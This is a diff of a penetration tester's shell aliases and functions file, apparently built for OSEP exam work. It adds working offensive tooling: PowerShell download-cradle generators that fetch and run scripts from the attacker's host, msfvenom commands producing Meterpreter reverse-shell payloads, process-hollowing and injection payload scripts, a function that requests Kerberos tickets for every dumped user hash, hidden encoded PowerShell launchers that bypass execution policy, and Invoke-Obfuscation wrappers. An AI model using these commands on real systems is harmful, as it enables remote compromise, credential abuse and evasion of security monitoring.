@@ -20,7 +20,7 @@ alias unblock_dir='sudo chmod -R 755'
 alias block_dir='sudo chmod -R 700'
 
 ## grep aliases
-alias grep="grep --color=always"
+alias grep="grep --color=never"
 alias ngrep="grep -n"
 alias egrep="egrep --color=auto"
 alias fgrep="fgrep --color=auto"
@@ -223,18 +223,19 @@ function nginxhere() {
                 echo "You can access the nginxwebserver via the following url: "
                 echo "http://$IPV4:$PORT_HTTP"
                 echo "https://$IPV4:$PORT_HTTPS\n"
-                echo "be aware that you can always attach to the container to observe the logs:"
-                echo "docker attach $NGINX_CONTAINER_NAME\n"
+  
                 echo "If you wish to stop the container run:"
                 echo "nginxstop\n"
+
                 echo "If you wish to stop the container run: "
                 echo "nginxpurge\n\n"
+
 
                 echo "Generating a file with PowerShell Download cradles"
                 iexurls $IPV4 $PORT_HTTP | tee iex-cradles.txt
                 echo "use pscradles - to get the cradles\n"
 
-
+                sudo docker attach nginx
         else
                 echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443 tun0${NC}"
         fi
@@ -262,18 +263,42 @@ function iexurls(){
         if [ $# -eq 2 ];then
                 IP=$1
                 PORT=$2
-                find . -name "*.ps1" | while read SCRIPT_PATH 
+                find /home/vagrant/OSEP -name "*.ps1" | while read SCRIPT_PATH 
                         do
                                 DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
-                                DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo "$DOWNLOAD_CRADLE"
-                                echo "$DOWNLOAD_CRADLE_OBFS"
+                                # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
+                                echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/vagrant\/OSEP//g"
+                                # echo "$DOWNLOAD_CRADLE_OBFS"
                                 echo "\n"
                         done
         else
                 echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
         fi
 }
+
+function psdownloadcradles(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+
+        if [ $# -eq 3 ];then
+                IP=$1
+                PORT=$2
+                EXTESION=$3
+                find /home/vagrant/OSEP -name "*.$EXTESION" | while read SCRIPT_PATH 
+                        do
+                                FILENAME=$(echo "$SCRIPT_PATH" | rev | cut -d"/" -f1 | rev) 
+                                DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$SCRIPT_PATH','C:/Users/Public/$FILENAME')"
+                                # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
+                                echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/vagrant\/OSEP//g"
+                                # echo "$DOWNLOAD_CRADLE_OBFS"
+                                echo "\n"
+                        done
+        else
+                echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
+        fi
+}
+
+alias iexurlsgrep="iexurls | grep --color=never"
 
 alias nginxstop="sudo docker container stop nginx"
 alias nginxpurge="sudo docker container stop nginx && sudo docker image rm miguel1337/nginxhere"
@@ -386,6 +411,9 @@ echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - WEB - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
 
+echo "fuxploider - fuxploider to check for upload vulnerabilties: "
+alias fuxploider='sudo docker run --rm -v "${PWD}:/home/fuxploider" -it --name fuxploider fuxploider'
+
 echo "shcheck - Security Header Check; shcheck <url> + <args>"
 alias shcheck='sudo docker run --rm -it --name shcheck miguel1337/shcheck:latest'
 
@@ -463,6 +491,8 @@ function msfgenpayloads(){
                 echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vbscript"
                 msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
 
+                python /home/vagrant/OSEP/payloads/powerhollow.py "$IPV4" "$TCP_PORT" 'c:\windows\system32\svchost.exe' 'explorer ps' -out '/home/vagrant/OSEP/payloads/run_64.txt' -p 'windows/x64/meterpreter/reverse_tcp'
+
                 echo "\n${YELLOW}${BOLD}Payloads have been generated successfully. Bye${NC}"
 
         else
@@ -471,8 +501,190 @@ function msfgenpayloads(){
 }
 
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
-echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
+echo -e "${YELLOW}${BOLD}[ - OSEP - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
+echo "oseppayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>"
+function oseppayloads(){
+        CURR_PWD=`pwd`
+        cd /home/vagrant/OSEP/payloads
+        rm meterpreter*
+
+        if [ $# -eq 3 ];then
+                INTERFACE=$1
+                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
+                HTTPS_PORT=$2
+                TCP_PORT=$3
+
+                echo "Generating meterpreter payloads..."
+
+
+                echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+
+
+                echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
+
+                
+                echo "\n${YELLOW}${BOLD}Generating meterpreter VBA${NC}"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
+                echo ""
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
+
+
+                echo "\n${YELLOW}${BOLD}Generating AES-256 meterpreter_x64_reverse_https Powershell${NC}"
+                echo "Command: python powerhollow.py $IPV4 $TCP_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_x64_reverse_tcp_hollow_$IPV4-$TCP_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
+                python powerhollow.py "$IPV4" "$TCP_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_x64_reverse_tcp_hollow_$IPV4-$TCP_PORT.ps1" -p "windows/x64/meterpreter/reverse_tcp"
+                echo "Command: python powerhollow.py $IPV4 $HTTPS_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_x64_reverse_https_hollow_$IPV4-$HTTPS_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
+                python powerhollow.py "$IPV4" "$HTTPS_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_x64_reverse_https_hollow_$IPV4-$HTTPS_PORT.ps1" -p "windows/x64/meterpreter/reverse_https"
+
+                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_https $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_x64_reverse_https_inject_$IPV4-$HTTPS_PORT.ps1"
+                python powerinject.py -p "windows/x64/meterpreter/reverse_https" "$IPV4" "$HTTPS_PORT" "svchost" "M" "ps" -out "meterpreter_x64_reverse_https_inject_$IPV4-$HTTPS_PORT.ps1"
+                python powerinject.py -p "windows/x64/meterpreter/reverse_tcp" "$IPV4" "$TCP_PORT" "svchost" "M" "ps" -out "meterpreter_x64_reverse_tcp_inject_$IPV4-$TCP_PORT.ps1"
+
+                echo "\n${YELLOW}${BOLD}Payloads have been generated successfully. Bye${NC}"
+
+        else
+                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>${NC}"
+        fi
+        cd $CURR_PWD
+}
+
+
+echo -e "${YELLOW}${BOLD}\n========================${NC}"
+echo -e "${YELLOW}${BOLD}[ - AD - ]${NC}"
+echo -e "${YELLOW}${BOLD}========================${NC}"
+echo "docker-bloodhound.py - Collect data for bloodhound - bloodhound.py <args>"
+alias docker-bloodhound.py='sudo docker run --rm -ti -v "${PWD}:/bloodhound-data" --entrypoint="/usr/local/bin/bloodhound-python" -it "bloodhound.py"'
+
+
+echo "neo4jhere - Start neo4j and save data in current directory - neo4jhere <PROJECT_NAME>"
+function neo4jhere(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 1 ];then
+                PROJECT_NAME=$1
+                echo -n "Password: "
+                read -s PASS
+                sudo docker run --name "neo4j-$PROJECT_NAME" -p 7474:7474 -p 7687:7687 -d -v "${PWD}/neo4j/data:/data" -v "${PWD}/neo4j/logs:/logs" -v "${PWD}/neo4j/import:/var/lib/neo4j/import" -v "${PWD}/neo4j/plugins:/plugins" --env "NEO4J_AUTH=neo4j/$PASS" neo4j:latest
+                echo "you can access neo4j under the following:"
+                echo "neo4j web service - http://localhost:7474"
+                echo "neo4j bolt - bolt://localhost:7687"
+                echo "Username: neo4j"
+                echo "Password: $PASS\n"
+                echo "The docker container is running under the name neo4j_$PROJECT_NAME"
+        else
+                echo -e "${RED}Please enter a project name as argument ... neo4jhere <PROJECT_NAME>${NC}"
+        fi
+}
+
+echo "gimmetgt - Gets a tgt for every user in a secretsdump file - gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>" #this is just a for fun and profit function... not good for opsec :)
+function gimmetgt(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 2 ];then
+                DOMAIN_NAME=$1
+                PATH_SECRETSDUMPFILE=$2
+                i=1
+                cat $PATH_SECRETSDUMPFILE |  grep ":::" --color=NEVER | grep "$DOMAIN_NAME" --color=NEVER | cut -d":" -f1,4 | cut -d "\\" -f2 | while read line 
+                do
+                        USER_NAME=$(echo "$line" | cut -d":" -f1)
+                        USER_HASH=$(echo "$line" | cut -d":" -f2)
+                        echo "Tickets are incoming ..."
+                        proxychains impacket-getTGT $DOMAIN_NAME/$USER_NAME -hashes :$USER_HASH
+                done
+                
+        else
+                echo -e "${RED}Please enter a secretsdump output as argument ... gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>${NC}"
+        fi
+}
+echo "psencodecmd - encoding a single command - psencodecmd"
+function psencodecmd(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+
+
+        if [ $# -eq 0 ];then
+                echo -n "PowerShell Command: "
+                read PS_COMMAND
+                echo ""
+                echo -n "cmd.exe /c powershell -ep bypass -windowstyle hidden -enc "
+                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0
+                echo ""
+                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0 | pbcopy
+
+                echo "Encded command has been copies to your clipboard"
+        elif [[ $# -eq 1 ]]; then
+                PS_COMMAND=$1
+                echo ""
+                echo -n "cmd.exe /c powershell -ep bypass -windowstyle hidden -enc "
+                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0
+                echo ""
+                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0 | pbcopy
+                echo "Encded command has been copies to your clipboard"
+        else
+                echo -e "${RED}Usage: psencodecmd${NC}"
+                echo -e "${RED}Usage: psencodecmd <CMD>${NC}"
+        fi
+
+}
+
+echo "psobfuscatecmd - obfuscating a single command - psobfuscatecmd"
+function psobfuscatecmd(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 0 ];then
+                echo -n "PowerShell Command: "
+                read PS_COMMAND
+                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
+        elif [[ $# -eq 1 ]]; then
+                PS_COMMAND=$1
+                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
+        else
+                echo -e "${RED}Usage: psobfuscatecmd${NC}"
+                echo -e "${RED}Usage: psobfuscatecmd <CMD>${NC}"
+        fi
+}
+
+echo "psobfuscatescript - obfuscating a script - psobfuscatescript <SCRIPT_PATH.ps1>"
+function psobfuscatescript(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 1 ];then
+                SCRIPT_PATH=$1
+                echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
+                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"  | tee $SCRIPT_PATH.obfs.txt
+        else
+                echo -e "${RED}psobfuscatescript <SCRIPT.ps1>${NC}"
+        fi
+}
+
+echo "psobfuscaterecursively - obfuscating all ps1 script within a path - psobfuscaterecursively <PATH>"
+function psobfuscaterecursively(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 1 ];then
+                find . | grep ".ps1" --color=never | grep Tools --color=never | sort | while read SCRIPT_PATH 
+                do
+                        echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
+                        pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet" | tee $SCRIPT_PATH.obfs.txt
+                done
+        else
+                echo -e "${RED}psobfuscaterecursively${NC}"
+        fi
+}
+
+
 echo "pshelp - command templates for Windows"
 function pshelp(){
         cat << EOF
@@ -525,98 +737,6 @@ EOF
 
 }
 
-echo -e "${YELLOW}${BOLD}\n========================${NC}"
-echo -e "${YELLOW}${BOLD}[ - AD - ]${NC}"
-echo -e "${YELLOW}${BOLD}========================${NC}"
-echo "docker-bloodhound.py - Collect data for bloodhound - bloodhound.py <args>"
-alias docker-bloodhound.py='sudo docker run --rm -ti -v "${PWD}:/bloodhound-data" --entrypoint="/usr/local/bin/bloodhound-python" -it "bloodhound.py"'
-
-
-echo "neo4jhere - Start neo4j and save data in current directory - neo4jhere <PROJECT_NAME>"
-function neo4jhere(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 1 ];then
-                PROJECT_NAME=$1
-                echo -n "Password: "
-                read -s PASS
-                sudo docker run --name "neo4j-$PROJECT_NAME" -p 7474:7474 -p 7687:7687 -d -v "${PWD}/neo4j/data:/data" -v "${PWD}/neo4j/logs:/logs" -v "${PWD}/neo4j/import:/var/lib/neo4j/import" -v "${PWD}/neo4j/plugins:/plugins" --env "NEO4J_AUTH=neo4j/$PASS" neo4j:latest
-                echo "you can access neo4j under the following:"
-                echo "neo4j web service - http://localhost:7474"
-                echo "neo4j bolt - bolt://localhost:7687"
-                echo "Username: $NEO4J_USER"
-                echo "Password: $PASS\n"
-                echo "The docker container is running under the name neo4j_$PROJECT_NAME"
-        else
-                echo -e "${RED}Please enter a project name as argument ... neo4jhere <PROJECT_NAME>${NC}"
-        fi
-}
-
-echo "gimmetgt - Gets a tgt for every user in a secretsdump file - gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>" #this is just a for fun and profit function... not good for opsec :)
-function gimmetgt(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 2 ];then
-                DOMAIN_NAME=$1
-                PATH_SECRETSDUMPFILE=$2
-                i=1
-                cat $PATH_SECRETSDUMPFILE |  grep ":::" --color=NEVER | grep "$DOMAIN_NAME" --color=NEVER | cut -d":" -f1,4 | cut -d "\\" -f2 | while read line 
-                do
-                        USER_NAME=$(echo "$line" | cut -d":" -f1)
-                        USER_HASH=$(echo "$line" | cut -d":" -f2)
-                        echo "Tickets are incoming ..."
-                        proxychains impacket-getTGT $DOMAIN_NAME/$USER_NAME -hashes :$USER_HASH
-                done
-                
-        else
-                echo -e "${RED}Please enter a secretsdump output as argument ... gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>${NC}"
-        fi
-}
-
-echo "psobfuscatecmd - obfuscating a single command - psobfuscatecmd"
-function psobfuscatecmd(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 0 ];then
-                echo -n "PowerShell Command: "
-                read PS_COMMAND
-                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
-        elif [[ $# -eq 1 ]]; then
-                PS_COMMAND=$1
-                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
-        else
-                echo -e "${RED}Usage: psobfuscatecmd${NC}"
-                echo -e "${RED}Usage: psobfuscatecmd <CMD>${NC}"
-        fi
-}
-
-echo "psobfuscatescript - obfuscating a script - psobfuscatescript <SCRIPT_PATH.ps1>"
-function psobfuscatescript(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 1 ];then
-                SCRIPT_PATH=$1
-                echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
-                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"  | tee $SCRIPT_PATH.obfs.txt
-        else
-                echo -e "${RED}psobfuscatescript <SCRIPT.ps1>${NC}"
-        fi
-}
-
-echo "psobfuscaterecursively - obfuscating all ps1 script within a path - psobfuscaterecursively <PATH>"
-function psobfuscaterecursively(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 1 ];then
-                find . | grep ".ps1" --color=never | grep Tools --color=never | sort | while read SCRIPT_PATH 
-                do
-                        echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
-                        pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet" | tee $SCRIPT_PATH.obfs.txt
-                done
-        else
-                echo -e "${RED}psobfuscaterecursively${NC}"
-        fi
-}
 
 
 
